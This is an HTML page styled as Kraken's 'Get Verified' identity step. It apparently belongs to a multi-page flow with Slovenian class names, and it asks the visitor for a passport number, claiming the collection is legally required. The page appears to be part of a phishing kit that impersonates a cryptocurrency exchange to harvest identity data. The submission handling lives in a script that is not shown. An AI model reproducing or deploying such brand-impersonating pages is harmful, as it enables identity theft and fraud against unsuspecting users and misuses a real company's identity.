<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Get Verified - Kraken</title>
  <link rel="icon" type="image" href="../img/favicon.ico">
  <link rel="stylesheet" href="../css/style.css">
  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
</head>
<body>

  <header class="glavni-header">
    <a href="login.html" class="polje-logotip">
      <img src="../img/logo-full.svg" class="image-logotip">
    </a>

    <div class="dejanja-header">
      <label class="jezikovni-button">
        <img src="../img/icons/globe.svg" alt="" class="icon-jezika" width="16" height="16">
      </label>
      <a href="login.html" class="button-header-svetel">Sign out</a>
    </div>
  </header>

  <main class="glavni-vsebnik">
    <div class="pod-nav">
      <a href="poll-2.html" class="button-nazaj">‹ Back</a>
      <a href="../index.html" class="button-zapri" title="Exit">✕</a>
    </div>

    <div class="kartica besedilo-levo">
      <h1 class="mehki-naslov-kartice">Personal Identification</h1>
      <p class="podnaslov-kartice">This information helps us verify your identity. We’re legally required to collect this info. </p>

      <div class="skatla-povzetek">
        <div class="icon-povzetek"><img src="../img/icons/globe.svg" alt="Country" width="20" height="20"></div>
        <div>
          <div class="label-povzetek">Selected Country</div>
          <div class="vrednost-povzetek" id="summary-country-text">🇸🇮 Slovenia</div>
        </div>
      </div>

      <form id="poll-3-form" action="login.html" method="GET">
        <div class="skupina-polja">
          <input type="text" id="poll-info-field" class="besedilno-polje" placeholder=" " minlength="5" maxlength="9" required>
          <label class="lebdeca-label" for="poll-info-field">Passport number</label>
        </div>

        <div class="seznam-potrditev">
          <label class="potrditveni-element">
            <input type="checkbox" checked required>
            <span>I confirm all provided information is accurate.</span>
          </label>
        </div>

        <button type="submit" class="button glavni-button">Complete Registration</button>
      </form>
    </div>
  </main>

  <footer class="glavni-footer">
    <div class="povezave-footer">
      <a href="#">Privacy Notice</a>
      <a href="#">Terms of Service</a>
    </div>
  </footer>

  <script src="../js/script.js"></script>
</body>
</html>
